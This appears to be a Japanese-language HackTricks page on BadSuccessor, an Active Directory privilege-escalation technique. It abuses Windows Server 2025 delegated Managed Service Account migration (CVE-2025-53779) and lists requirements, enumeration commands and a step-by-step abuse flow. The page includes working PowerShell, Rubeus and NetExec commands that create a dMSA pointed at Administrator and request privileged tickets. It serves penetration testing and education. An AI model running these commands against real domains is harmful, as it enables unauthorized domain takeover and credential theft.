# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** は、**Windows Server 2025** で導入された **delegated Managed Service Account** (**dMSA**) の移行ワークフローを悪用します。dMSA は **`msDS-ManagedAccountPrecededByLink`** を通じて従来のアカウントにリンクでき、**`msDS-DelegatedMSAState`** に保存される migration state を通って移行できます。攻撃者が書き込み可能な OU に dMSA を作成し、これらの属性を制御できる場合、KDC はリンクされたアカウントの **authorization context** を持つ、攻撃者が制御する dMSA に対して ticket を発行できます。

実際には、委任された OU 権限しか持たない低権限ユーザーが、新しい dMSA を作成して `Administrator` を指し示し、migration state を完了させ、その後 **Domain Admins** のような特権グループを含む PAC を持つ TGT を取得できる、という意味です。

## 重要な dMSA migration details

- dMSA は **Windows Server 2025** の機能です。
- `Start-ADServiceAccountMigration` は migration を **started** 状態に設定します。
- `Complete-ADServiceAccountMigration` は migration を **completed** 状態に設定します。
- `msDS-DelegatedMSAState = 1` は migration started を意味します。
- `msDS-DelegatedMSAState = 2` は migration completed を意味します。
- 正当な migration では、dMSA は置き換え対象のアカウントを透過的に代替することを意図しているため、KDC/LSA は前のアカウントがすでに持っていたアクセスを維持します。

Microsoft Learn でも、migration 中は元のアカウントが dMSA に結び付けられ、dMSA は古いアカウントがアクセスできたものにアクセスすることを意図していると説明されています。BadSuccessor はこの security assumption を悪用します。

## 要件

1. **dMSA が存在する**ドメインであること。つまり AD 側で **Windows Server 2025** のサポートがあること。
2. 攻撃者がある OU 内で `msDS-DelegatedManagedServiceAccount` オブジェクトを**作成**できる、または同等の広い child-object creation 権限を持っていること。
3. 攻撃者が関連する dMSA 属性を**書き込める**か、作成した dMSA を完全に制御できること。
4. 攻撃者が domain-joined なコンテキスト、または LDAP/Kerberos に到達できる tunnel から Kerberos ticket を要求できること。

### Practical checks

最も分かりやすい operator signal は、domain/forest level を確認し、環境がすでに新しい Server 2025 stack を使用していることを確認することです:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
`Windows2025Domain` や `Windows2025Forest` のような値を見た場合は、**BadSuccessor / dMSA migration abuse** を優先的に確認してください。

公開されているツールを使って、dMSA 作成用に委任されている writable OUs も列挙できます：
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. dMSAを、delegated create-child rights を持つOUに作成する。
2. **`msDS-ManagedAccountPrecededByLink`** を、`CN=Administrator,CN=Users,DC=corp,DC=local` のような privileged target のDNに設定する。
3. **`msDS-DelegatedMSAState`** を `2` に設定して、migration が完了したことを示す。
4. 新しい dMSA の TGT を要求し、返された ticket を使って privileged services にアクセスする。

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / operational tooling examples:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## これは権限昇格以上である理由

正当な移行では、Windows は cutover 前に以前のアカウントに対して発行されたチケットを処理するため、新しい dMSA も必要とします。これが、dMSA 関連の ticket material に **`KERB-DMSA-KEY-PACKAGE`** フロー内で **current** と **previous** の両方の keys が含まれうる理由です。

攻撃者が制御する偽の migration では、この挙動により BadSuccessor は次のように使えます。

- PAC 内で特権グループの SIDs を継承することによる **権限昇格**
- **credential material exposure**。previous-key の処理により、脆弱なワークフローでは前任者の RC4/NT hash に相当する material が露出しうるため

そのため、この technique は直接的な domain takeover だけでなく、pass-the-hash やより広範な credential compromise などの後続 operation にも有用です。

## パッチ状況に関する注意

元の BadSuccessor の挙動は **単なる理論上の 2025 preview issue ではありません**。Microsoft はこれに **CVE-2025-53779** を割り当て、**2025年8月** に security update を公開しました。この attack は次の用途のために記録しておいてください。

- **labs / CTFs / assume-breach exercises**
- **未パッチの Windows Server 2025 環境**
- **assessment 中の OU delegation と dMSA exposure の検証**

dMSA が存在するからといって、Windows Server 2025 の domain が脆弱だと決めつけないでください。パッチレベルを確認し、慎重にテストしてください。

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
